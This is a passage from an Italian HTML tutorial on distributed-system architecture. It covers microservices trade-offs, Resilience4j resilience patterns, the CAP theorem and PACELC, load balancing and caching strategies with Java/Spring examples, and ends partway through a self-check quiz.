                            <td>Debugging e tracing più facile</td>
                            <td>Un bug può bloccare tutto il sistema</td>
                        </tr>
                        <tr>
                            <td>Nessun overhead di rete interno</td>
                            <td>Technology lock-in (un solo stack)</td>
                        </tr>
                        <tr>
                            <td>Team piccoli, startup, MVP</td>
                            <td>Deploy richiede rilascio di tutto</td>
                        </tr>
                    </tbody>
                </table>

                <h3>Microservices: Pro e Contro</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Pro</th>
                            <th>Contro</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>Scaling indipendente per servizio</td>
                            <td>Complessità operativa elevata</td>
                        </tr>
                        <tr>
                            <td>Deploy indipendenti</td>
                            <td>Latenza di rete tra servizi</td>
                        </tr>
                        <tr>
                            <td>Fault isolation (un servizio fallisce, altri continuano)</td>
                            <td>Transazioni distribuite complesse (Saga pattern)</td>
                        </tr>
                        <tr>
                            <td>Team autonomi, ownership chiara</td>
                            <td>Debugging distribuito difficile</td>
                        </tr>
                        <tr>
                            <td>Polyglot (linguaggi/DB diversi)</td>
                            <td>Overhead: service discovery, API gateway, observability</td>
                        </tr>
                    </tbody>
                </table>

                <div class="info-box warning">
                    <h4>Domanda trabocchetto ai colloqui</h4>
                    <p>"Quando useresti i microservizi?"<br><br>
                    <strong>Risposta NON banale:</strong> Non "quando l'applicazione è grande". I microservizi sono giustificati quando hai: (1) team multipli che devono lavorare indipendentemente, (2) parti del sistema con requisiti di scaling molto diversi, (3) necessità di deploy frequenti e indipendenti, (4) volontà di investire in infrastruttura (CI/CD, monitoring, service mesh). Per una startup o un MVP, un monolite ben strutturato è quasi sempre la scelta migliore.</p>
                </div>

                <h3>Modular Monolith: Il compromesso</h3>

                <p>Un <strong>Modular Monolith</strong> combina i vantaggi di entrambi: deploy singolo ma con boundaries chiari tra moduli, preparando una futura migrazione a microservizi se necessario.</p>

                <pre><code class="language-java">// Struttura Modular Monolith
com.myapp/
├── user/
│   ├── api/           // Interfacce pubbliche del modulo
│   │   └── UserApi.java
│   ├── internal/      // Implementazione (package-private)
│   │   ├── UserService.java
│   │   └── UserRepository.java
│   └── UserModule.java
├── order/
│   ├── api/
│   │   └── OrderApi.java
│   ├── internal/
│   │   ├── OrderService.java
│   │   └── OrderRepository.java
│   └── OrderModule.java
└── payment/
    └── ...

// Regola: i moduli comunicano SOLO tramite API pubbliche
// MAI accesso diretto a classi internal di altri moduli

// ArchUnit test per enforcare i boundaries
@Test
void modulesShouldNotDependOnInternalPackages() {
    classes()
        .that().resideInAPackage("..order..")
        .should().onlyAccessClassesThat()
        .resideOutsideOfPackage("..user.internal..")
        .check(importedClasses);
}</code></pre>
            </section>

            <!-- Resilience Patterns Section -->
            <section class="section" id="modulo3-resilience">
                <h2>Resilience Patterns</h2>

                <p>Nei sistemi distribuiti, i fallimenti sono inevitabili. I pattern di resilienza permettono al sistema di degradare gracefully invece di fallire completamente.</p>

                <h3>Circuit Breaker Pattern</h3>

                <p>Il <strong>Circuit Breaker</strong> previene chiamate ripetute a un servizio che sta fallendo, permettendogli di recuperare e proteggendo il sistema da cascade failures.</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                      CIRCUIT BREAKER STATE MACHINE                          │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│                         ┌─────────────────┐                                 │
│                         │                 │                                 │
│     Failure threshold   │     CLOSED      │   Normal operation              │
│     reached             │   (allowing)    │   Requests pass through         │
│          ┌──────────────│                 │                                 │
│          │              └────────┬────────┘                                 │
│          │                       │                                          │
│          │                       │ Success                                  │
│          │                       │ (reset counter)                          │
│          │                       │                                          │
│          ▼                       │                                          │
│   ┌──────────────┐               │                                          │
│   │              │               │                                          │
│   │    OPEN      │───────────────┘                                          │
│   │  (blocking)  │                                                          │
│   │              │   Timeout expires                                        │
│   └──────┬───────┘   (e.g., 30 seconds)                                     │
│          │                                                                  │
│          │                                                                  │
│          ▼                                                                  │
│   ┌──────────────┐                                                          │
│   │              │                                                          │
│   │  HALF-OPEN   │   Allow limited requests                                 │
│   │  (testing)   │   to test if service recovered                           │
│   │              │                                                          │
│   └──────┬───────┘                                                          │
│          │                                                                  │
│    ┌─────┴─────┐                                                            │
│    │           │                                                            │
│    ▼           ▼                                                            │
│ Success     Failure                                                         │
│    │           │                                                            │
│    │           └──────► Back to OPEN                                        │
│    │                                                                        │
│    └──────────────────► Back to CLOSED                                      │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <pre><code class="language-java">// Implementazione con Resilience4j
@Configuration
public class CircuitBreakerConfig {

    @Bean
    public CircuitBreakerRegistry circuitBreakerRegistry() {
        CircuitBreakerConfig config = CircuitBreakerConfig.custom()
            .failureRateThreshold(50)           // Apre se 50% fallimenti
            .slowCallRateThreshold(50)          // Apre se 50% chiamate lente
            .slowCallDurationThreshold(Duration.ofSeconds(2))
            .waitDurationInOpenState(Duration.ofSeconds(30))
            .permittedNumberOfCallsInHalfOpenState(5)
            .slidingWindowSize(10)              // Ultimi 10 risultati
            .slidingWindowType(SlidingWindowType.COUNT_BASED)
            .build();

        return CircuitBreakerRegistry.of(config);
    }
}

@Service
public class PaymentService {

    private final CircuitBreaker circuitBreaker;
    private final PaymentGateway paymentGateway;

    public PaymentService(CircuitBreakerRegistry registry, PaymentGateway gateway) {
        this.circuitBreaker = registry.circuitBreaker("paymentGateway");
        this.paymentGateway = gateway;
    }

    public PaymentResult processPayment(PaymentRequest request) {
        return circuitBreaker.executeSupplier(() ->
            paymentGateway.process(request)
        );

        // Oppure con fallback
        return CircuitBreaker.decorateSupplier(circuitBreaker,
            () -> paymentGateway.process(request))
            .recover(CallNotPermittedException.class,
                e -> PaymentResult.serviceUnavailable())
            .recover(TimeoutException.class,
                e -> PaymentResult.timeout())
            .get();
    }
}

// Con annotation (Spring Boot + resilience4j-spring-boot2)
@Service
public class PaymentService {

    @CircuitBreaker(name = "paymentGateway", fallbackMethod = "fallbackPayment")
    public PaymentResult processPayment(PaymentRequest request) {
        return paymentGateway.process(request);
    }

    private PaymentResult fallbackPayment(PaymentRequest request, Exception e) {
        log.warn("Payment gateway unavailable, using fallback", e);
        return PaymentResult.queued(); // Metti in coda per retry successivo
    }
}</code></pre>

                <h3>Bulkhead Pattern</h3>

                <p>Il <strong>Bulkhead</strong> (paratia) isola le risorse tra diversi tipi di chiamate, prevenendo che un singolo servizio lento esaurisca tutte le risorse.</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                         BULKHEAD PATTERN                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   SENZA BULKHEAD                    CON BULKHEAD                            │
│   ──────────────                    ────────────                            │
│                                                                             │
│   ┌─────────────────────┐           ┌─────────────────────┐                 │
│   │   Thread Pool (20)  │           │    Order Service    │                 │
│   │                     │           │   Thread Pool (10)  │                 │
│   │ ████████████████████│           │   ██████████        │                 │
│   │ (all used by slow   │           └─────────────────────┘                 │
│   │  Payment service)   │                                                   │
│   │                     │           ┌─────────────────────┐                 │
│   │ Other services      │           │   Payment Service   │                 │
│   │ BLOCKED! ⛔         │           │   Thread Pool (5)   │                 │
│   └─────────────────────┘           │   █████ (saturated) │                 │
│                                     └─────────────────────┘                 │
│   Se Payment è lento,                                                       │
│   TUTTO si blocca                   ┌─────────────────────┐                 │
│                                     │   User Service      │                 │
│                                     │   Thread Pool (5)   │                 │
│                                     │   ██                │ ← Still works!  │
│                                     └─────────────────────┘                 │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <pre><code class="language-java">// Bulkhead con Resilience4j
@Service
public class OrderService {

    @Bulkhead(name = "orderService", type = Bulkhead.Type.THREADPOOL)
    public CompletableFuture&lt;Order&gt; createOrderAsync(OrderRequest request) {
        return CompletableFuture.supplyAsync(() -> processOrder(request));
    }

    @Bulkhead(name = "orderService", type = Bulkhead.Type.SEMAPHORE,
              fallbackMethod = "fallbackCreateOrder")
    public Order createOrder(OrderRequest request) {
        return processOrder(request);
    }

    private Order fallbackCreateOrder(OrderRequest request, BulkheadFullException e) {
        throw new ServiceOverloadedException("Order service is overloaded, try again later");
    }
}

// application.yml
resilience4j:
  bulkhead:
    instances:
      orderService:
        maxConcurrentCalls: 20          # Semaphore bulkhead
        maxWaitDuration: 500ms
  thread-pool-bulkhead:
    instances:
      orderService:
        maxThreadPoolSize: 10           # Thread pool bulkhead
        coreThreadPoolSize: 5
        queueCapacity: 20</code></pre>

                <h3>Retry Pattern con Exponential Backoff</h3>

                <pre><code class="language-java">// Retry con Resilience4j
@Service
public class ExternalApiService {

    @Retry(name = "externalApi", fallbackMethod = "fallback")
    public Response callExternalApi(Request request) {
        return externalClient.call(request);
    }

    private Response fallback(Request request, Exception e) {
        log.error("All retries failed for request: {}", request, e);
        throw new ExternalServiceException("Service unavailable after retries", e);
    }
}

// application.yml
resilience4j:
  retry:
    instances:
      externalApi:
        maxAttempts: 3
        waitDuration: 1s
        enableExponentialBackoff: true
        exponentialBackoffMultiplier: 2    # 1s, 2s, 4s
        retryExceptions:
          - java.io.IOException
          - java.util.concurrent.TimeoutException
        ignoreExceptions:
          - com.myapp.BusinessException     # Non ritentare errori business</code></pre>

                <h3>Timeout Pattern</h3>

                <pre><code class="language-java">// Timeout con Resilience4j
@Service
public class SlowService {

    @TimeLimiter(name = "slowService", fallbackMethod = "timeoutFallback")
    public CompletableFuture&lt;Result&gt; slowOperation() {
        return CompletableFuture.supplyAsync(() -> {
            // Operazione potenzialmente lenta
            return performSlowOperation();
        });
    }

    private CompletableFuture&lt;Result&gt; timeoutFallback(TimeoutException e) {
        return CompletableFuture.completedFuture(Result.timeout());
    }
}

// application.yml
resilience4j:
  timelimiter:
    instances:
      slowService:
        timeoutDuration: 5s
        cancelRunningFuture: true</code></pre>

                <div class="info-box success">
                    <h4>Combinare i pattern</h4>
                    <p>I pattern di resilienza si combinano spesso insieme. L'ordine tipico è:<br>
                    <code>Retry → CircuitBreaker → Bulkhead → TimeLimiter</code><br><br>
                    Con Resilience4j puoi stackare le annotation:</p>
                </div>

                <pre><code class="language-java">@CircuitBreaker(name = "backend")
@Bulkhead(name = "backend")
@Retry(name = "backend")
@TimeLimiter(name = "backend")
public CompletableFuture&lt;Response&gt; callBackend(Request request) {
    return CompletableFuture.supplyAsync(() -> backendClient.call(request));
}</code></pre>
            </section>

            <!-- CAP Theorem Section -->
            <section class="section" id="modulo3-cap">
                <h2>CAP Theorem</h2>

                <p>Il <strong>CAP Theorem</strong> (Brewer's Theorem) afferma che un sistema distribuito può garantire al massimo <strong>due</strong> delle seguenti tre proprietà contemporaneamente.</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                            CAP THEOREM                                      │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│                          CONSISTENCY                                        │
│                              (C)                                            │
│                               ▲                                             │
│                              ╱ ╲                                            │
│                             ╱   ╲                                           │
│                            ╱     ╲                                          │
│                           ╱       ╲                                         │
│                          ╱   CA    ╲                                        │
│                         ╱  (RDBMS)  ╲                                       │
│                        ╱  Single node╲                                      │
│                       ╱───────────────╲                                     │
│                      ╱                 ╲                                    │
│                     ╱        CP         ╲                                   │
│                    ╱    (MongoDB,        ╲                                  │
│                   ╱      HBase,           ╲                                 │
│                  ╱       Redis Cluster)    ╲                                │
│                 ╱─────────────────────────────╲                             │
│                ╱                               ╲                            │
│               ╱             AP                  ╲                           │
│              ╱        (Cassandra,                ╲                          │
│             ╱          DynamoDB,                  ╲                         │
│            ╱           CouchDB)                    ╲                        │
│           ▼─────────────────────────────────────────▼                       │
│     AVAILABILITY                              PARTITION                     │
│         (A)                                   TOLERANCE                     │
│                                                  (P)                        │
│                                                                             │
│   ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│   C - Consistency: Ogni lettura riceve la scrittura più recente             │
│                    (o un errore)                                            │
│                                                                             │
│   A - Availability: Ogni richiesta riceve una risposta                      │
│                     (non necessariamente i dati più recenti)                │
│                                                                             │
│   P - Partition Tolerance: Il sistema continua a funzionare                 │
│                            nonostante perdita di messaggi tra nodi          │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <div class="info-box warning">
                    <h4>Interpretazione corretta del CAP</h4>
                    <p>Il CAP theorem è spesso frainteso. In un sistema distribuito reale, le <strong>partition</strong> (network failure) ACCADONO. Quindi la vera scelta è tra <strong>CP</strong> e <strong>AP</strong> durante una partition:<br><br>
                    <strong>CP</strong>: Durante una partition, rifiuta le richieste per garantire consistency<br>
                    <strong>AP</strong>: Durante una partition, continua a servire richieste (possibilmente dati stale)</p>
                </div>

                <h3>PACELC: Estensione del CAP</h3>

                <p>Il modello <strong>PACELC</strong> estende il CAP: se c'è una Partition (P), scegli tra Availability e Consistency (AC); Else (E), quando il sistema funziona normalmente, scegli tra Latency e Consistency (LC).</p>

                <table>
                    <thead>
                        <tr>
                            <th>Sistema</th>
                            <th>Durante Partition (PAC)</th>
                            <th>Else (ELC)</th>
                            <th>Classificazione</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>DynamoDB, Cassandra</td>
                            <td>Availability</td>
                            <td>Latency</td>
                            <td>PA/EL</td>
                        </tr>
                        <tr>
                            <td>MongoDB, HBase</td>
                            <td>Consistency</td>
                            <td>Consistency</td>
                            <td>PC/EC</td>
                        </tr>
                        <tr>
                            <td>PNUTS (Yahoo)</td>
                            <td>Consistency</td>
                            <td>Latency</td>
                            <td>PC/EL</td>
                        </tr>
                    </tbody>
                </table>

                <h3>Consistency Models</h3>

                <pre><code class="language-java">// Strong Consistency (CP systems)
// Ogni lettura vede l'ultima scrittura
// Esempio: transazione bancaria
public void transfer(Account from, Account to, BigDecimal amount) {
    // DEVE essere consistente - non possiamo avere soldi "persi"
    transactionTemplate.execute(status -> {
        from.debit(amount);
        to.credit(amount);
        return null;
    });
}

// Eventual Consistency (AP systems)
// Le letture potrebbero vedere dati stale, ma convergeranno
// Esempio: contatore like su un social network
public void incrementLikes(String postId) {
    // Okay se per qualche secondo utenti diversi vedono conteggi diversi
    cassandraTemplate.update(
        Query.query(where("id").is(postId)),
        Update.update("likes", QueryBuilder.incr())
    );
}

// Read-your-writes Consistency
// Garantisce che TU veda le TUE scritture
// Esempio: aggiornamento profilo utente
@Service
public class ProfileService {
    public Profile updateProfile(String userId, ProfileUpdate update) {
        Profile updated = repository.save(update);
        // Forza la lettura dal primary per questo utente
        sessionCache.put(userId, updated);
        return updated;
    }

    public Profile getProfile(String userId, String requestingUserId) {
        if (userId.equals(requestingUserId)) {
            // Utente che legge il proprio profilo - usa cache/primary
            return sessionCache.getOrDefault(userId,
                () -> repository.findByIdFromPrimary(userId));
        }
        // Altri utenti - eventual consistency ok
        return repository.findById(userId);
    }
}</code></pre>
            </section>

            <!-- Load Balancing Section -->
            <section class="section" id="modulo3-loadbalancing">
                <h2>Load Balancing</h2>

                <p>Il <strong>Load Balancing</strong> distribuisce il traffico tra multiple istanze di un servizio per migliorare availability, throughput e latenza.</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                       LOAD BALANCING STRATEGIES                             │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   1. ROUND ROBIN                                                            │
│   ──────────────                                                            │
│                                                                             │
│   Request 1 ──────► Server A                                                │
│   Request 2 ──────► Server B                                                │
│   Request 3 ──────► Server C                                                │
│   Request 4 ──────► Server A  (ricomincia)                                  │
│                                                                             │
│   Pro: Semplice, distribuzione equa                                         │
│   Contro: Non considera il carico effettivo dei server                      │
│                                                                             │
│   ─────────────────────────────────────────────────────────────────────     │
│                                                                             │
│   2. LEAST CONNECTIONS                                                      │
│   ────────────────────                                                      │
│                                                                             │
│   Server A: 5 connections  ◄────── Request (va qui, meno connessioni)       │
│   Server B: 12 connections                                                  │
│   Server C: 8 connections                                                   │
│                                                                             │
│   Pro: Adatta al carico reale                                               │
│   Contro: Non considera la "pesantezza" delle connessioni                   │
│                                                                             │
│   ─────────────────────────────────────────────────────────────────────     │
│                                                                             │
│   3. WEIGHTED ROUND ROBIN                                                   │
│   ────────────────────────                                                  │
│                                                                             │
│   Server A (weight=5): riceve 5 richieste                                   │
│   Server B (weight=3): riceve 3 richieste  } ogni 10 richieste              │
│   Server C (weight=2): riceve 2 richieste                                   │
│                                                                             │
│   Pro: Server più potenti ricevono più traffico                             │
│   Contro: Richiede configurazione manuale dei pesi                          │
│                                                                             │
│   ─────────────────────────────────────────────────────────────────────     │
│                                                                             │
│   4. CONSISTENT HASHING                                                     │
│   ──────────────────────                                                    │
│                                                                             │
│                    ┌───────────────────┐                                    │
│                   ╱                     ╲                                   │
│                  ╱    Hash Ring          ╲                                  │
│                 │                         │                                 │
│                 │  A ●         ● B        │                                 │
│                 │       user123           │                                 │
│                 │          ↓              │                                 │
│                 │      ● C    ● D         │                                 │
│                  ╲                       ╱                                  │
│                   ╲                     ╱                                   │
│                    └───────────────────┘                                    │
│                                                                             │
│   user123 → hash → posizione sul ring → server più vicino (in senso orario)│
│                                                                             │
│   Pro: Aggiunta/rimozione server sposta solo 1/n delle chiavi              │
│   Contro: Possibile distribuzione non uniforme (risolto con virtual nodes) │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>L4 vs L7 Load Balancing</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Caratteristica</th>
                            <th>L4 (Transport Layer)</th>
                            <th>L7 (Application Layer)</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>Opera su</strong></td>
                            <td>TCP/UDP (IP + porta)</td>
                            <td>HTTP/HTTPS (headers, path, cookies)</td>
                        </tr>
                        <tr>
                            <td><strong>Performance</strong></td>
                            <td>Molto alta (no parsing)</td>
                            <td>Più bassa (deve parsare HTTP)</td>
                        </tr>
                        <tr>
                            <td><strong>Routing</strong></td>
                            <td>Solo per IP/porta</td>
                            <td>Per path, header, cookie, ecc.</td>
                        </tr>
                        <tr>
                            <td><strong>SSL Termination</strong></td>
                            <td>No (passa attraverso)</td>
                            <td>Sì</td>
                        </tr>
                        <tr>
                            <td><strong>Esempi</strong></td>
                            <td>AWS NLB, HAProxy (TCP mode)</td>
                            <td>AWS ALB, Nginx, HAProxy (HTTP mode)</td>
                        </tr>
                    </tbody>
                </table>

                <pre><code class="language-java">// Client-side load balancing con Spring Cloud LoadBalancer
@Configuration
public class LoadBalancerConfig {

    @Bean
    @LoadBalanced  // Abilita load balancing su RestTemplate
    public RestTemplate restTemplate() {
        return new RestTemplate();
    }
}

@Service
public class OrderService {
    private final RestTemplate restTemplate;

    public User getUser(Long userId) {
        // "user-service" è il nome del servizio in service discovery
        // Spring risolve automaticamente a un'istanza disponibile
        return restTemplate.getForObject(
            "http://user-service/api/users/{id}",
            User.class,
            userId
        );
    }
}

// Custom load balancer con Spring Cloud LoadBalancer
@Configuration
public class CustomLoadBalancerConfig {

    @Bean
    public ReactorLoadBalancer&lt;ServiceInstance&gt; customLoadBalancer(
            ServiceInstanceListSupplier supplier) {
        return new RoundRobinLoadBalancer(supplier, "user-service");
    }

    // Oppure implementazione custom
    @Bean
    public ReactorLoadBalancer&lt;ServiceInstance&gt; weightedLoadBalancer(
            ServiceInstanceListSupplier supplier) {
        return new ReactorServiceInstanceLoadBalancer() {
            @Override
            public Mono&lt;Response&lt;ServiceInstance&gt;&gt; choose(Request request) {
                return supplier.get()
                    .next()
                    .map(instances -> {
                        // Logica custom: scegli in base a weight nei metadata
                        ServiceInstance chosen = selectByWeight(instances);
                        return new DefaultResponse(chosen);
                    });
            }
        };
    }
}</code></pre>
            </section>

            <!-- Caching Section -->
            <section class="section" id="modulo3-caching">
                <h2>Caching Strategies</h2>

                <p>Il <strong>Caching</strong> è fondamentale per la scalabilità. Una cache ben progettata può ridurre il carico sul database di ordini di grandezza e migliorare drasticamente la latency.</p>

                <h3>Caching Patterns</h3>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                         CACHING PATTERNS                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   1. CACHE-ASIDE (Lazy Loading)                                             │
│   ─────────────────────────────                                             │
│                                                                             │
│   ┌─────────┐      1. Get        ┌─────────┐                                │
│   │   App   │─────────────────►│  Cache  │                                 │
│   │         │◄─────────────────│         │                                 │
│   │         │      2. Miss       └─────────┘                                │
│   │         │                                                               │
│   │         │      3. Get        ┌─────────┐                                │
│   │         │─────────────────►│   DB    │                                 │
│   │         │◄─────────────────│         │                                 │
│   │         │      4. Return     └─────────┘                                │
│   │         │                                                               │
│   │         │      5. Put        ┌─────────┐                                │
│   │         │─────────────────►│  Cache  │                                 │
│   └─────────┘                    └─────────┘                                │
│                                                                             │
│   Pro: Solo dati richiesti in cache, resiliente a cache failure             │
│   Contro: Cache miss penalty, possibile stale data                          │
│                                                                             │
│   ─────────────────────────────────────────────────────────────────────     │
│                                                                             │
│   2. WRITE-THROUGH                                                          │
│   ────────────────                                                          │
│                                                                             │
│   ┌─────────┐      1. Write      ┌─────────┐      2. Write   ┌─────────┐   │
│   │   App   │─────────────────►│  Cache  │───────────────►│   DB    │    │
│   │         │◄─────────────────│         │◄───────────────│         │    │
│   └─────────┘      4. ACK        └─────────┘      3. ACK     └─────────┘   │
│                                                                             │
│   Pro: Cache sempre consistente con DB                                      │
│   Contro: Latenza scrittura alta (2 write sincrone)                         │
│                                                                             │
│   ─────────────────────────────────────────────────────────────────────     │
│                                                                             │
│   3. WRITE-BEHIND (Write-Back)                                              │
│   ────────────────────────────                                              │
│                                                                             │
│   ┌─────────┐      1. Write      ┌─────────┐                                │
│   │   App   │─────────────────►│  Cache  │                                 │
│   │         │◄─────────────────│         │                                 │
│   └─────────┘      2. ACK        │         │                                │
│                     (immediato)  │         │      3. Async    ┌─────────┐   │
│                                  │         │      batch write │   DB    │   │
│                                  │         │─────────────────►│         │   │
│                                  └─────────┘                  └─────────┘   │
│                                                                             │
│   Pro: Latenza scrittura bassa, batch writes                                │
│   Contro: Rischio perdita dati se cache crasha prima del flush              │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Cache Invalidation Strategies</h3>

                <pre><code class="language-java">// 1. TTL-based expiration
@Cacheable(value = "users", key = "#userId")
@CacheConfig(cacheNames = "users")
public User getUser(Long userId) {
    return userRepository.findById(userId).orElseThrow();
}

// application.yml - TTL configuration
spring:
  cache:
    type: redis
    redis:
      time-to-live: 3600000  # 1 ora in millisecondi

// 2. Event-driven invalidation
@Service
public class UserService {

    @CacheEvict(value = "users", key = "#user.id")
    public User updateUser(User user) {
        User updated = userRepository.save(user);
        // Pubblica evento per invalidare cache su altri nodi
        eventPublisher.publish(new UserUpdatedEvent(user.getId()));
        return updated;
    }
}

@Component
public class CacheInvalidationListener {

    @EventListener
    public void onUserUpdated(UserUpdatedEvent event) {
        cacheManager.getCache("users").evict(event.getUserId());
    }
}

// 3. Cache versioning (per invalidazione di massa)
@Service
public class ProductCatalogService {

    private final AtomicLong catalogVersion = new AtomicLong(0);

    @Cacheable(value = "products", key = "#productId + '-' + @productCatalogService.catalogVersion")
    public Product getProduct(Long productId) {
        return productRepository.findById(productId).orElseThrow();
    }

    public void refreshCatalog() {
        catalogVersion.incrementAndGet();  // Invalida tutte le entry
    }

    public long getCatalogVersion() {
        return catalogVersion.get();
    }
}</code></pre>

                <h3>Redis vs Memcached</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Caratteristica</th>
                            <th>Redis</th>
                            <th>Memcached</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>Data structures</strong></td>
                            <td>String, List, Set, Hash, Sorted Set, Stream</td>
                            <td>Solo String (key-value)</td>
                        </tr>
                        <tr>
                            <td><strong>Persistence</strong></td>
                            <td>RDB snapshots, AOF log</td>
                            <td>No (solo in-memory)</td>
                        </tr>
                        <tr>
                            <td><strong>Replication</strong></td>
                            <td>Master-replica, Redis Cluster</td>
                            <td>No built-in</td>
                        </tr>
                        <tr>
                            <td><strong>Pub/Sub</strong></td>
                            <td>Sì</td>
                            <td>No</td>
                        </tr>
                        <tr>
                            <td><strong>Lua scripting</strong></td>
                            <td>Sì</td>
                            <td>No</td>
                        </tr>
                        <tr>
                            <td><strong>Memory efficiency</strong></td>
                            <td>Moderata (overhead strutture dati)</td>
                            <td>Alta (slab allocator ottimizzato)</td>
                        </tr>
                        <tr>
                            <td><strong>Use case ideale</strong></td>
                            <td>Cache + session + queue + leaderboard</td>
                            <td>Simple caching ad alto throughput</td>
                        </tr>
                    </tbody>
                </table>

                <pre><code class="language-java">// Distributed locking con Redis (Redisson)
@Service
public class InventoryService {

    private final RedissonClient redisson;

    public boolean reserveStock(String productId, int quantity) {
        RLock lock = redisson.getLock("inventory:" + productId);

        try {
            // Acquisisce lock con timeout
            if (lock.tryLock(5, 30, TimeUnit.SECONDS)) {
                try {
                    int currentStock = getStock(productId);
                    if (currentStock >= quantity) {
                        updateStock(productId, currentStock - quantity);
                        return true;
                    }
                    return false;
                } finally {
                    lock.unlock();
                }
            }
            throw new LockAcquisitionException("Could not acquire lock");
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            throw new RuntimeException(e);
        }
    }
}

// Rate limiting con Redis
@Service
public class RateLimiter {

    private final StringRedisTemplate redis;

    public boolean isAllowed(String userId, int maxRequests, Duration window) {
        String key = "ratelimit:" + userId;
        long now = System.currentTimeMillis();
        long windowStart = now - window.toMillis();

        // Sliding window log algorithm
        redis.opsForZSet().removeRangeByScore(key, 0, windowStart);

        Long count = redis.opsForZSet().zCard(key);
        if (count != null && count >= maxRequests) {
            return false;
        }

        redis.opsForZSet().add(key, String.valueOf(now), now);
        redis.expire(key, window);
        return true;
    }
}</code></pre>

                <div class="info-box warning">
                    <h4>Cache Stampede (Thundering Herd)</h4>
                    <p>Quando una chiave popolare scade, molte richieste simultanee potrebbero tutte andare al DB. Soluzioni:<br><br>
                    1. <strong>Locking</strong>: Solo una richiesta rigenera la cache<br>
                    2. <strong>Probabilistic early expiration</strong>: Rigenera prima della scadenza<br>
                    3. <strong>Background refresh</strong>: Thread separato che aggiorna la cache</p>
                </div>
            </section>

            <!-- Quiz Section Module 3 -->
            <section class="quiz-section" id="modulo3-quiz">
                <h2>Interactive Challenge Quiz - Architettura</h2>
                <p style="color: var(--text-secondary); margin-bottom: 30px;">Verifica la tua comprensione di architettura e scalabilità.</p>

                <!-- Question 11 -->
                <div class="quiz-question" data-correct="c">
                    <h4><span>Q1.</span> Un Circuit Breaker è nello stato HALF-OPEN. Cosa succede se la prossima richiesta fallisce?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q11" id="q11a" value="a">
                            <label for="q11a">Rimane in HALF-OPEN e permette un'altra richiesta di test</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q11" id="q11b" value="b">
                            <label for="q11b">Torna in CLOSED perché ha già aspettato abbastanza</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q11" id="q11c" value="c">
                            <label for="q11c">Torna in OPEN e ricomincia il timeout</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q11" id="q11d" value="d">
                            <label for="q11d">Entra in uno stato DISABLED permanente</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q11')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q11"></div>
                </div>

                <!-- Question 12 -->
                <div class="quiz-question" data-correct="b">
                    <h4><span>Q2.</span> Secondo il CAP theorem, durante una network partition, un sistema che sceglie <strong>Availability</strong> su <strong>Consistency</strong>...</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q12" id="q12a" value="a">
                            <label for="q12a">Rifiuta tutte le scritture ma permette le letture</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q12" id="q12b" value="b">
                            <label for="q12b">Continua a servire richieste, anche se i dati potrebbero essere stale o divergenti tra nodi</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q12" id="q12c" value="c">
                            <label for="q12c">Blocca tutte le richieste finché la partition non si risolve</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q12" id="q12d" value="d">
                            <label for="q12d">Elegge automaticamente un nuovo leader per mantenere consistency</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q12')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q12"></div>
                </div>

                <!-- Question 13 -->
                <div class="quiz-question" data-correct="a">
                    <h4><span>Q3.</span> Quale caching pattern è più appropriato per un sistema dove la latenza di scrittura è critica e una piccola perdita di dati in caso di crash è accettabile?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q13" id="q13a" value="a">
                            <label for="q13a"><strong>Write-Behind</strong> - scrive in cache e poi asincronamente al DB</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q13" id="q13b" value="b">
                            <label for="q13b"><strong>Write-Through</strong> - scrive sincronamente sia in cache che DB</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q13" id="q13c" value="c">
                            <label for="q13c"><strong>Cache-Aside</strong> - l'applicazione gestisce manualmente cache e DB</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q13" id="q13d" value="d">
                            <label for="q13d"><strong>Read-Through</strong> - la cache carica automaticamente dal DB</label>
                        </div>
                    </div>
